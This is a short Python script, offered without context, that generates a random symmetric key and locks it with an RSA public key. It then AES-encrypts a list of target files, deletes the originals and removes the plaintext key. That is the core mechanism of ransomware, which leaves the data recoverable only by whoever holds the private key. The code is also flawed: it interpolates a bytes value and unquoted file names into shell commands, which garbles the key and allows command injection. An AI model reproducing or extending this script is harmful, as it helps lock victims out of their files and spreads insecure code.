import os
import random
import subprocess

# Create a random symmetric key using OpenSSL
smem = subprocess.check_output("openssl rand -hex 64", shell=True)
os.system("echo {} > smem.unenc".format(smem))

# Encrypt the symmetric key and save it to disk
subprocess.check_output("openssl pkeyutl -encrypt -in smem.unenc -out smem-enc.enc -inkey public_key.pub -pubin", shell=True)

# List of targets to be encrypted
targets = ["secret1.txt", "secret2.txt", "secret3.txt"]

# Encrypt the target files using OpenSSL
for target in targets:
    if os.path.exists(target):
        os.system("openssl aes-256-cbc -e -in {} -out {}.enc -pass file:smem.unenc".format(target, target))
        os.remove(target)

# Clear the symmetric key from memory
del smem
os.remove("smem.unenc")
